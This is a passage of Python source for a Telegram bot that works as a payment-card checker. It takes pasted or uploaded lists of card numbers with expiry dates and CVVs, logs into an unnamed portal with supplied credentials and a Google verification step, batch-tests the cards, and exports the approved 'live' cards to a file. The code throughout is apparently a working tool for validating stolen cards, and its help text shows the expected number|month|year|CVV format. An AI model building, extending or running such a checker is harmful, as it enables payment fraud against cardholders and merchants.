        bot.reply_to(message, "❌ Please login first using the 🔐 Login button!", 
                    reply_markup=KeyboardManager.main_menu())
        return
    
    # Check file type
    if not message.document.file_name.lower().endswith('.txt'):
        bot.reply_to(message, "❌ Please upload only .txt files!")
        return
    
    # Check file size (max 10MB)
    if message.document.file_size > 10 * 1024 * 1024:
        bot.reply_to(message, "❌ File too large! Maximum 10MB allowed.")
        return
    
    try:
        # Download and process file
        processing_msg = bot.reply_to(message, "📥 **Downloading file...**", parse_mode='Markdown')
        
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        bot.edit_message_text("🔍 **Extracting cards...**", user_id, processing_msg.message_id, parse_mode='Markdown')
        
        # Extract cards
        file_content = downloaded_file.decode('utf-8', errors='ignore')
        cards = InputValidator.extract_cards_from_text(file_content)
        
        if not cards:
            bot.edit_message_text("❌ **No valid cards found in file!**", user_id, processing_msg.message_id, parse_mode='Markdown')
            return
        
        bot.edit_message_text(f"✅ **Found {len(cards)} valid cards!**", user_id, processing_msg.message_id, parse_mode='Markdown')
        
        # Process cards
        success, message_text = card_processor.process_cards_batch(user_id, cards)
        
        if success:
            # Send dashboard
            dashboard_text = MessageFormatter.format_dashboard(user_id, len(cards))
            dashboard_msg = bot.send_message(user_id, dashboard_text, 
                                           parse_mode='Markdown',
                                           reply_markup=KeyboardManager.dashboard_menu(user_id))
            session['dashboard_msg_id'] = dashboard_msg.message_id
        else:
            bot.send_message(user_id, f"❌ **Error:** {message_text}")
            
    except Exception as e:
        logger.error(f"File processing error: {e}")
        bot.reply_to(message, f"❌ **File processing error:** {str(e)}")

# ============= Callback Handlers =============

@bot.callback_query_handler(func=lambda call: call.data.startswith('action_'))
def handle_action_callbacks(call):
    user_id = call.from_user.id
    action = call.data.replace('action_', '')
    
    try:
        if action == 'login':
            session = session_manager.get_session(user_id)
            if session.get('logged_in'):
                bot.answer_callback_query(call.id, "✅ Already logged in!")
                return
            
            bot.answer_callback_query(call.id)
            msg = bot.send_message(user_id, "📧 **Please enter your email address:**", parse_mode='Markdown')
            bot.register_next_step_handler(msg, process_email_input)
            
        elif action == 'check':
            session = session_manager.get_session(user_id)
            if not session.get('logged_in'):
                bot.answer_callback_query(call.id, "❌ Login required!")
                return
            
            bot.answer_callback_query(call.id)
            instruction_text = """
╭─────────────────────────╮
│    💳 **SEND CARDS TO CHECK**    │
╰─────────────────────────╯

**💡 Methods:**
1️⃣ **Text Message:** Paste cards directly
2️⃣ **Upload File:** Send .txt file with cards

**📝 Format Required:**
```
4100390600114058|11|2026|515
5555555555554444|12|2025|123
```

**⚡ Features:**
• Max {MAX_CARDS_PER_SESSION} cards per session
• Live results appear instantly
• Real-time dashboard updates
• Export approved cards

**🚀 Ready to check your cards!**
""".format(MAX_CARDS_PER_SESSION=MAX_CARDS_PER_SESSION)
            
            bot.send_message(user_id, instruction_text, parse_mode='Markdown')
            
        elif action == 'dashboard':
            bot.answer_callback_query(call.id)
            results = session_manager.get_results(user_id)
            dashboard_text = MessageFormatter.format_dashboard(user_id, 0)
            
            try:
                dashboard_msg = bot.send_message(user_id, dashboard_text, 
                                               parse_mode='Markdown',
                                               reply_markup=KeyboardManager.dashboard_menu(user_id))
                session = session_manager.get_session(user_id)
                session['dashboard_msg_id'] = dashboard_msg.message_id
            except Exception as e:
                logger.error(f"Dashboard display error: {e}")
                bot.send_message(user_id, "❌ Dashboard error. Please try again.")
            
        elif action == 'help':
            bot.answer_callback_query(call.id)
            handle_help(call.message)
            
        elif action == 'new_session':
            bot.answer_callback_query(call.id, "🆕 Starting new session...")
            
            # Stop any running processes
            session_manager.stop_flags[user_id] = True
            
            # Clean up user data
            session_manager.cleanup_user(user_id)
            
            # Reinitialize
            session_manager.get_session(user_id)
            session_manager.get_results(user_id)
            
            bot.send_message(user_id, """
🆕 **New session started!**

All previous data cleared. Please login again to continue.
""", parse_mode='Markdown', reply_markup=KeyboardManager.main_menu())
            
        elif action == 'main_menu':
            bot.answer_callback_query(call.id)
            try:
                bot.edit_message_reply_markup(user_id, call.message.message_id, 
                                            reply_markup=KeyboardManager.main_menu())
            except:
                bot.send_message(user_id, "📋 **Main Menu**", 
                               reply_markup=KeyboardManager.main_menu())
    
    except Exception as e:
        logger.error(f"Action callback error: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

def process_email_input(message):
    user_id = message.from_user.id
    
    if not message.text:
        bot.reply_to(message, "❌ Please send text only!")
        return
    
    email = message.text.strip()
    
    # Basic email validation
    email_pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
    if not re.match(email_pattern, email):
        bot.reply_to(message, "❌ **Invalid email format!**\n\nPlease enter a valid email address.", parse_mode='Markdown')
        return
    
    session = session_manager.get_session(user_id)
    session['temp_email'] = email
    
    msg = bot.send_message(user_id, f"✅ **Email:** `{email}`\n\n🔑 **Now enter your password:**", parse_mode='Markdown')
    bot.register_next_step_handler(msg, process_password_input)

def process_password_input(message):
    user_id = message.from_user.id
    
    if not message.text:
        bot.reply_to(message, "❌ Please send text only!")
        return
    
    password = message.text.strip()
    session = session_manager.get_session(user_id)
    email = session.get('temp_email')
    
    if not email:
        bot.reply_to(message, "❌ Session expired. Please start login again.")
        return
    
    # Delete password message for security
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except:
        pass
    
    # Show login progress
    login_msg = bot.send_message(user_id, "🔄 **Authenticating...**\n\n⏳ Please wait...", parse_mode='Markdown')
    
    # Attempt login
    checker = session['checker']
    
    try:
        if checker.login_to_portal(email, password):
            bot.edit_message_text("✅ **Portal login successful!**\n\n🔄 **Sending verification...**", 
                                 user_id, login_msg.message_id, parse_mode='Markdown')
            
            if checker.send_google_ask():
                session['logged_in'] = True
                session['email'] = email
                session['last_activity'] = time.time()
                
                bot.edit_message_text(f"""
✅ **Login Successful!**

📧 **Email:** `{email}`
🕐 **Time:** {datetime.now().strftime('%H:%M:%S')}
🔐 **Status:** Authenticated

You can now check cards! 🚀
""", user_id, login_msg.message_id, parse_mode='Markdown', 
                                     reply_markup=KeyboardManager.main_menu())
            else:
                bot.edit_message_text("❌ **Verification failed!**\n\nGoogle authentication unsuccessful.", 
                                     user_id, login_msg.message_id, parse_mode='Markdown')
        else:
            bot.edit_message_text("❌ **Login failed!**\n\nInvalid email or password.", 
                                 user_id, login_msg.message_id, parse_mode='Markdown')
    
    except Exception as e:
        logger.error(f"Login error for user {user_id}: {e}")
        bot.edit_message_text(f"❌ **Login error!**\n\n`{str(e)}`", 
                             user_id, login_msg.message_id, parse_mode='Markdown')
    
    # Clean up temp data
    session.pop('temp_email', None)

# Dashboard and results callbacks
@bot.callback_query_handler(func=lambda call: 'show_' in call.data or 'export_' in call.data or 
                                              'refresh_' in call.data or 'stop_' in call.data or
                                              'back_dashboard' in call.data)
def handle_dashboard_callbacks(call):
    user_id = call.from_user.id
    action = call.data
    
    try:
        if action.startswith('show_'):
            status_filter = action.split('_')[1]
            show_filtered_results(user_id, status_filter, call)
            
        elif action.startswith('export_'):
            export_type = action.split('_')[1]
            export_results(user_id, export_type, call)
            
        elif action.startswith('refresh_dashboard_'):
            bot.answer_callback_query(call.id, "🔄 Refreshed!")
            update_dashboard_message(user_id, call.message.message_id)
            
        elif action.startswith('stop_checking_'):
            if user_id in session_manager.threads and session_manager.threads[user_id].is_alive():
                session_manager.stop_flags[user_id] = True
                bot.answer_callback_query(call.id, "🛑 Stopping process...")
                bot.send_message(user_id, "🛑 **Processing stopped by user**", parse_mode='Markdown')
            else:
                bot.answer_callback_query(call.id, "No active process!")
                
        elif action.startswith('back_dashboard_'):
            bot.answer_callback_query(call.id)
            update_dashboard_message(user_id, call.message.message_id)
    
    except Exception as e:
        logger.error(f"Dashboard callback error: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

def show_filtered_results(user_id: int, status_filter: str, call):
    """Show filtered results based on status"""
    results = session_manager.get_results(user_id)
    
    if not results.get('cards'):
        bot.answer_callback_query(call.id, "No cards processed yet!")
        return
    
    # Filter cards based on status
    if status_filter == 'approved':
        filtered_cards = [c for c in results['cards'] if c.status == 'Approved']
        title = "✅ APPROVED CARDS"
    elif status_filter == 'declined':
        filtered_cards = [c for c in results['cards'] if c.status == 'Declined']
        title = "❌ DECLINED CARDS"
    elif status_filter == 'errors':
        filtered_cards = [c for c in results['cards'] if c.status not in ['Approved', 'Declined']]
        title = "⚠️ ERROR CARDS"
    else:  # all
        filtered_cards = results['cards']
        title = "📋 ALL CARDS"
    
    if not filtered_cards:
        bot.answer_callback_query(call.id, f"No {status_filter} cards found!")
        return
    
    bot.answer_callback_query(call.id)
    
    # Show last 10 cards
    display_cards = filtered_cards[-10:]
    
    result_text = f"""
╭─────────────────────────╮
│      {title}      │
╰─────────────────────────╯

**📊 Total {status_filter.title()}:** {len(filtered_cards)}
**🔍 Showing:** Last {len(display_cards)} cards

"""
    
    for i, card_result in enumerate(display_cards, 1):
        status_emoji = "✅" if card_result.status == 'Approved' else "❌" if card_result.status == 'Declined' else "⚠️"
        result_text += f"**{i}.** `{card_result.card}` {status_emoji}\n"
        result_text += f"    💬 {card_result.message}\n"
        if hasattr(card_result, 'time_taken'):
            result_text += f"    ⏱️ {card_result.time_taken}s\n"
        result_text += "\n"
    
    if len(filtered_cards) > 10:
        result_text += f"... and {len(filtered_cards) - 10} more cards.\n"
    
    try:
        bot.edit_message_text(result_text, user_id, call.message.message_id,
                             parse_mode='Markdown',
                             reply_markup=KeyboardManager.back_to_dashboard(user_id))
    except Exception as e:
        # If message is too long, send as new message
        if "message is too long" in str(e).lower():
            bot.send_message(user_id, "⚠️ **Too many results to display!**\n\nUse export feature to get all results.", 
                           parse_mode='Markdown',
                           reply_markup=KeyboardManager.back_to_dashboard(user_id))
        else:
            logger.error(f"Show results error: {e}")

def export_results(user_id: int, export_type: str, call):
    """Export results to file"""
    results = session_manager.get_results(user_id)
    
    if not results.get('cards'):
        bot.answer_callback_query(call.id, "No cards to export!")
        return
    
    bot.answer_callback_query(call.id, "📥 Preparing export...")
    
    try:
        # Filter cards based on export type
        if export_type == 'live':
            cards_to_export = [card_result.card for card_result in results['cards'] if card_result.status == 'Approved']
            file_name = f"live_cards_{user_id}.txt"
            caption = "✅ Live Cards Export"
        else:  # export_all
            cards_to_export = [card_result.card for card_result in results['cards']]
            file_name = f"all_cards_{user_id}.txt"
            caption = "📋 All Cards Export"
        
        if not cards_to_export:
            bot.send_message(user_id, f"❌ No {export_type} cards to export!", parse_mode='Markdown')
            return
        
        # Write to temporary file
        with open(file_name, 'w', encoding='utf-8') as f:
            f.write('\n'.join(cards_to_export))
        
        # Send file
        with open(file_name, 'rb') as f:
            bot.send_document(user_id, f, caption=caption, parse_mode='Markdown')
        
        # Clean up
        os.remove(file_name)
        
    except Exception as e:
        logger.error(f"Export error for user {user_id}: {e}")
        bot.send_message(user_id, f"❌ Export error: {str(e)}", parse_mode='Markdown')

def update_dashboard_message(user_id: int, message_id: int):
    """Update the dashboard message with current stats"""
    try:
        results = session_manager.get_results(user_id)
        dashboard_text = MessageFormatter.format_dashboard(user_id, results['total'])
        
        bot.edit_message_text(
            dashboard_text,
            user_id,
            message_id,
            reply_markup=KeyboardManager.dashboard_menu(user_id),
            parse_mode='Markdown'
        )
    except Exception as e:
        if "message is not modified" not in str(e):
            logger.error(f"Dashboard update error: {e}")
            bot.send_message(user_id, "❌ Dashboard update failed. Please try again.", parse_mode='Markdown')

if __name__ == '__main__':
    logger.info("Bot starting...")
    bot.polling(none_stop=True)
